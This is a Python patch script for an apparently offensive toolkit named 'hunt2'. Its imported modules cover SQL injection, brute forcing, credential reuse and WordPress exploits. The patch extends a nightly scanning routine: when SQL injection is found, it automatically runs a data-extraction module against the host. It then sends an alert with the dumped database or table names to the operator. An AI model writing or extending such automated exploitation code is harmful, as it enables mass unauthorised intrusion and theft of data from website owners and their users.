# -*- coding: utf-8 -*-
import io, py_compile, sys
P = r"C:\work\hunt2\modules\night.py"
s = io.open(P, encoding="utf-8-sig").read()
old = """        out = _call(sqli.run, 180, host, kind)[0]
        if "ВРЕМЕННАЯ" in out or "ОШИБКА SQL" in out:
            rec["notes"].append("sqli")"""
new = """        out, sq, _e = _call(sqli.run, 180, host, kind)
        if "ВРЕМЕННАЯ" in out or "ОШИБКА SQL" in out:
            rec["notes"].append("sqli")
            if sq:
                _stage(st, host, "разработка", rec)
                ex = _call(extract.run, 420 if full else 120, host, sq, full)[1] or []
                if ex:
                    rec["notes"].append("вывод: %d" % len(ex))
                    loud = [f for f in ex if f["tag"] in ("extract:база", "extract:таблицы")]
                    if loud:
                        notify.send("ИНЪЕКЦИЯ\\n%s\\n%s" % (host, loud[0]["extra"]))"""
if s.count(old) != 1:
    print("night: инъекции не найдено"); sys.exit(1)
s = s.replace(old, new)
old2 = "from modules import admin, arch, brute, engine, files, keep, mass, orders, reuse, sqli, subdom, tpl, wp, wpfast, wpvuln"
new2 = "from modules import admin, arch, brute, engine, extract, files, keep, mass, orders, reuse, sqli, subdom, tpl, wp, wpfast, wpvuln"
if s.count(old2) != 1:
    print("night: импорт не найден"); sys.exit(1)
s = s.replace(old2, new2)
io.open(P, "w", encoding="utf-8-sig", newline="\n").write(s)
py_compile.compile(P, doraise=True)
print("night ок")
